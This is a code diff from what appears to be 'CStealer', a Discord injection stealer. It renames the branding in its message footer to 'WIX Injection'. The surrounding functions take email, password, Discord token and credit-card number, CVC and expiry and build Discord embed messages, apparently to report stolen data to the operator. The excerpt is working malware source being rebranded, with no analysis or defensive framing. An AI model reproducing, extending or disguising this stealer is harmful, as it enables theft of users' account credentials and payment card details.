@@ -766,7 +766,7 @@ const emailChanged = async (email, password, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-            text: 'CStealer Injection・https://github.com/can-kat/cstealer',
+            text: 'WIX Injection・https://github.com/can-kat/cstealer',
             icon_url: "https://media.discordapp.net/attachments/1111364024408494140/1111364181032177766/cs.png"
         },
       },
@@ -809,7 +809,7 @@ const PaypalAdded = async (token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-            text: 'CStealer Injection・https://github.com/can-kat/cstealer',
+            text: 'WIX Injection・https://github.com/can-kat/cstealer',
             icon_url: "https://media.discordapp.net/attachments/1111364024408494140/1111364181032177766/cs.png"
         },
       },
@@ -852,7 +852,7 @@ const ccAdded = async (number, cvc, expir_month, expir_year, token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-            text: 'CStealer Injection・https://github.com/can-kat/cstealer',
+            text: 'WIX Injection・https://github.com/can-kat/cstealer',
             icon_url: "https://media.discordapp.net/attachments/1111364024408494140/1111364181032177766/cs.png"
         },
       },
@@ -897,7 +897,7 @@ const nitroBought = async (token) => {
           icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
         },
         footer: {
-            text: 'CStealer Injection・https://github.com/can-kat/cstealer',
+            text: 'WIX Injection・https://github.com/can-kat/cstealer',
             icon_url: "https://media.discordapp.net/attachments/1111364024408494140/1111364181032177766/cs.png"
         },
       },
